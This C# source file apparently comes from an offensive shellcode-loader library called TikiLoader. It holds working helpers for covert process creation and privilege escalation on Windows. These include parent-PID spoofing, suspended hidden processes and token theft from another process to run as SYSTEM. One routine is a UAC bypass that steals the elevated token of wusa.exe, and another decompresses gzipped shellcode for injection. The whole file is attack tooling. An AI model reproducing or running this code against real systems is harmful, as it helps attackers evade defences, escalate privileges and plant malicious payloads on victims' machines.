using System;
using System.IO;
using System.Diagnostics;
using System.IO.Compression;
using System.Runtime.InteropServices;

using static TikiLoader.Imports;
using static TikiLoader.Enums;
using static TikiLoader.Structs;

namespace TikiLoader
{
    public class Generic
    {
        private const int ProcThreadAttributeParentProcess = 0x00020000;

        public static PROCESS_INFORMATION StartProcess(string targetProcess, int parentProcessId)
        {
            STARTUPINFOEX sInfoEx = new STARTUPINFOEX();
            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();

            sInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(sInfoEx);
            IntPtr lpValue = IntPtr.Zero;

            try
            {
                SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
                SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
                pSec.nLength = Marshal.SizeOf(pSec);
                tSec.nLength = Marshal.SizeOf(tSec);

                CreationFlags flags = CreationFlags.CreateSuspended | CreationFlags.DetachedProcesds | CreationFlags.CreateNoWindow | CreationFlags.ExtendedStartupInfoPresent;

                IntPtr lpSize = IntPtr.Zero;

                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);

                IntPtr parentHandle = Process.GetProcessById(parentProcessId).Handle;
                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, parentHandle);

                UpdateProcThreadAttribute(sInfoEx.lpAttributeList, 0, (IntPtr)ProcThreadAttributeParentProcess, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                CreateProcess(targetProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref sInfoEx, out pInfo);

                return pInfo;

            }
            finally
            {
                DeleteProcThreadAttributeList(sInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(sInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(lpValue);
            }
        }

        public static PROCESS_INFORMATION StartProcessWOPid(string targetProcess)
        {
            STARTUPINFOEX sInfoEx = new STARTUPINFOEX();
            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();

            sInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(sInfoEx);
            IntPtr lpValue = IntPtr.Zero;

            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
            pSec.nLength = Marshal.SizeOf(pSec);
            tSec.nLength = Marshal.SizeOf(tSec);

            CreationFlags flags = CreationFlags.CreateSuspended | CreationFlags.DetachedProcesds | CreationFlags.CreateNoWindow;

            CreateProcess(targetProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref sInfoEx, out pInfo);

            return pInfo;

        }

        public static PROCESS_INFORMATION StartProcessAs(string path, string domain, string username, string password)
        {
            STARTUPINFO startInfo = new STARTUPINFO();
            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();

            CreationFlags flags = CreationFlags.CreateSuspended | CreationFlags.CreateNoWindow;
            CreateProcessWithLogonW(username, domain, password, LogonFlags.LogonWithProfile, path, "", flags, (uint)0, @"C:\Windows\System32", ref startInfo, out procInfo);

            return procInfo;
        }

        public static PROCESS_INFORMATION StartElevatedProcess(string binary, [Optional]int elevatedPID)
        {
            IntPtr hProcess = IntPtr.Zero;

            if (elevatedPID > 0)
            {
                hProcess = OpenProcess(0x00001000, false, elevatedPID);
            }
            else
            {
                SHELLEXECUTEINFO shellInfo = new SHELLEXECUTEINFO();

                shellInfo.cbSize = Marshal.SizeOf(shellInfo);
                shellInfo.fMask = 0x40;
                shellInfo.lpFile = "wusa.exe";
                shellInfo.nShow = 0x0;

                ShellExecuteEx(ref shellInfo);

                hProcess = shellInfo.hProcess;
            }

            IntPtr hToken = IntPtr.Zero;
            OpenProcessToken(hProcess, 0x02000000, ref hToken);

            IntPtr hNewToken = IntPtr.Zero;
            SECURITY_ATTRIBUTES secAttribs = new SECURITY_ATTRIBUTES();

            DuplicateTokenEx(hToken, 0xf01ff, ref secAttribs, 2, 1, ref hNewToken);

            SID_IDENTIFIER_AUTHORITY sia = new SID_IDENTIFIER_AUTHORITY();
            sia.Value = new byte[] { 0x0, 0x0, 0x0, 0x0, 0x0, 0x10 };

            IntPtr pSID = IntPtr.Zero;
            AllocateAndInitializeSid(ref sia, 1, 0x2000, 0, 0, 0, 0, 0, 0, 0, ref pSID);

            SID_AND_ATTRIBUTES saa = new SID_AND_ATTRIBUTES();
            saa.Sid = pSID;
            saa.Attributes = 0x20;

            TOKEN_MANDATORY_LABEL tml = new TOKEN_MANDATORY_LABEL();
            tml.Label = saa;
            int tmlSize = Marshal.SizeOf(tml);
            NtSetInformationToken(hNewToken, 25, ref tml, tmlSize);

            IntPtr luaToken = IntPtr.Zero;
            NtFilterToken(hNewToken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken);

            hNewToken = IntPtr.Zero;
            secAttribs = new SECURITY_ATTRIBUTES();

            DuplicateTokenEx(luaToken, 0xc, ref secAttribs, 2, 2, ref hNewToken);

            ImpersonateLoggedOnUser(hNewToken);

            STARTUPINFO sInfo = new STARTUPINFO();
            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();

            CreateProcessWithLogonW("xxx", "xxx", "xxx", LogonFlags.LogonNetCredentialsOnly, binary, "", CreationFlags.CreateSuspended, 0, @"C:\Windows\System32", ref sInfo, out pInfo);

            if (elevatedPID == 0)
                TerminateProcess(hProcess, 1);

            return pInfo;
        }

        public static PROCESS_INFORMATION StartProcessAsSystem(string binary, int duplicatePid)
        {
            IntPtr hProcess = OpenProcess(0x00001000, false, duplicatePid);

            IntPtr hToken = IntPtr.Zero;
            OpenProcessToken(hProcess, 0x02000000, ref hToken);

            IntPtr hNewToken = IntPtr.Zero;
            SECURITY_ATTRIBUTES secAttribs = new SECURITY_ATTRIBUTES();
            DuplicateTokenEx(hToken, 0xf01ff, ref secAttribs, 2, 1, ref hNewToken);

            STARTUPINFO sInfo = new STARTUPINFO();
            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();

            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();

            CreateProcessAsUser(hNewToken, binary, "", ref pSec, ref tSec, false, CreationFlags.CreateSuspended, IntPtr.Zero, @"C:\Windows\System32", ref sInfo, out pInfo);

            return pInfo;
        }

        public static byte[] DecompressShellcode(byte[] gzip)
        {
            using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
            {
                const int size = 4096;
                byte[] buffer = new byte[size];
                using (MemoryStream memory = new MemoryStream())
                {
                    int count = 0;
                    do
                    {
                        count = stream.Read(buffer, 0, size);
                        if (count > 0)
                        {
                            memory.Write(buffer, 0, count);
                        }
                    }
                    while (count > 0);
                    return memory.ToArray();
                }
            }
        }
    }
}